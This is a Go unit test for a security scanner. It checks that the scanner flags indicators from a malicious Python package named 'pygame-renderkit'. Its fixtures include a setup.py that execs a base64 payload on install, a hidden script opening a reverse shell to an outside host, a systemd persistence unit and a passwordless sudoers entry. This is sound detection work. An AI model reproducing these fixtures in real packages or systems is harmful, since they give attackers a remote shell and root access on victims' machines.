package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

func TestScan_PygameRenderkitSourceAndPersistenceIOCs(t *testing.T) {
	root := t.TempDir()
	files := map[string]string{
		filepath.Join("pygame-renderkit-1.2.0", "setup.py"): `
from setuptools.command.install import install
import base64, subprocess
HOST = "5uj0a8ziyu.localto.net"
payload = base64.b64decode("c3ludGhldGlj")
exec(compile(payload, "<string>", "exec"))
subprocess.Popen(["python3", "-c", payload], start_new_session=True)
setup(name="pygame-renderkit", version="1.2.0", cmdclass={"install": CustomInstall})
`,
		filepath.Join("tmp", ".rk_recon.py"): `
import pty, socket
HOST = "5uj0a8ziyu.localto.net"
s = socket.create_connection((HOST, 3900))
s.sendall(b"[EXFIL]redacted[ENDEXFIL]")
pty.spawn("/bin/bash")
`,
		filepath.Join("home", "user", ".config", "systemd", "user", "renderkit.service"): "[Service]\nExecStart=/usr/bin/python3 /tmp/.rk_recon.py\nRestart=always\n",
		filepath.Join("etc", "sudoers.d", ".renderkit"):                                  "developer ALL=(ALL) NOPASSWD: ALL\n",
	}
	for rel, raw := range files {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(raw), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, result := range res.Findings {
		if result.RuleID == "pygame-renderkit-reverse-shell-persistence-ioc" {
			count++
		}
	}
	if count != len(files) {
		t.Fatalf("pygame-renderkit findings = %d, want %d; findings=%+v", count, len(files), res.Findings)
	}
}
